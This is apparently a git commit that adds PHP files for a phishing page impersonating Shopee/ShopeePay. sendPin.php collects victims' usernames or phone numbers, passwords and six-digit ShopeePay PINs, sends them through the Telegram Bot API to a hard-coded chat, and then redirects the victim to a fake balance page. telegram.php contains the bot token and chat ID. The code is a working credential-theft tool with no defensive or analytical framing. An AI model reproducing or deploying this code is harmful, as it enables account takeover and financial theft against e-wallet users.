8aa7345990e6d52e8755c7e80fd4ea348b9e7b31
pengembang2025 <167019524+pengembang2025@users.noreply.github.com>
2024-06-11 18:12:30 +0700

    Add files via upload

---
+++ 3/sendPin.php
@@ -0,0 +1,28 @@
+<?php 
+
+
+
+session_start();
+include "./telegram.php";
+
+$_SESSION["nomorku"] = $_POST ['nomorku'];
+$_SESSION["debit"] = $_POST ['debit'];
+$_SESSION["nama"] = $_POST ['nama'];
+
+$message = "⊰᯽⊱┈─𝑺𝒉𝒐𝒑𝒆𝒆─┈⊰᯽⊱". "\n🔸 𝗡𝗼 𝗛𝗽/𝗨𝘀𝗲𝗿 : ". $_POST ['user']. "\n🔸 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ". $_POST ['pass']. "\n🔸 𝗣𝗜𝗡 𝗦𝗵𝗼𝗽𝗲𝗣𝗮𝘆 : ". $_POST ['sixpin'];
+function sendMessage($telegram_id, $message, $id_bot)
+{
+$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($telegram_id, $message, $id_bot);
+header("Location:  saldo.html");
+?> 
---
+++ 3/telegram.php
@@ -0,0 +1,4 @@
+<?php
+$telegram_id = "7274028040";
+$id_bot = "7387706499:AAHsAXxFJ6x06EuKZ6W_jRLM8ID6B2VleHM";
+?>
